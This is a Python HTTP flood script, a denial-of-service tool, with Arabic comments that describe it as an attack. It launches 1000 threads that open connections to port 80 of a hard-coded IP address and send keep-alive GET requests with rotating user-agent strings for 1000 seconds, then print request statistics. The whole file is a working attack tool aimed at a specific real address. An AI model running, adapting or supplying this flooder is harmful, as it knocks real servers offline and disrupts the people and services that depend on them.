import socket
import time
import random
import threading
from threading import Thread

# قائمة User-Agent
def UAlist():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "bbos",
        "urmom",
        "xd",
        "null"
    ]

# إحصاءات الهجوم
successful_requests = 0
failed_requests = 0
response_times = []

# الدالة التي تقوم بتنفيذ الهجوم
def http(ip, floodtime):
    global successful_requests, failed_requests, response_times
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                start_time = time.time()
                sock.connect((ip, 80))
                while time.time() < floodtime:
                    sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'.encode())
                    print("Request sent")
                    successful_requests += 1
                    response_times.append(time.time() - start_time)
            except:
                failed_requests += 1
                sock.close()

# الدالة الرئيسية
def main():
    global successful_requests, failed_requests, response_times
    
    ip = "82.153.70.229"
    port = 80
    threads = 1000
    time_duration = 1000
    floodtime = time.time() + int(time_duration)

    # بدء تنفيذ الهجوم
    for _ in range(int(threads)):
        Thread(target=http, args=(ip, floodtime)).start()

    # انتظار انتهاء الوقت المحدد للهجوم
    time.sleep(time_duration)

    # طباعة الإحصاءات
    print(f"عدد الطلبات الناجحة: {successful_requests}")
    print(f"عدد الطلبات الفاشلة: {failed_requests}")
    if response_times:
        print(f"متوسط وقت الاستجابة: {sum(response_times) / len(response_times):.2f} ثانية")
    else:
        print("لم يتم تسجيل أي وقت استجابة.")

if __name__ == "__main__":
    main()